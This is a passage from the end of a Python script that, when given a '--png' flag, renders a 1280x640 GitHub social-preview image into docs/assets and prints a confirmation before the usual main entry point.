    if "--png" in sys.argv:  # GitHub's social preview must be a PNG or JPG
        render_png(social(T), ASSETS / "social-preview.png", 1280, 640)
        print("wrote docs/assets/social-preview.png")


if __name__ == "__main__":
    main()
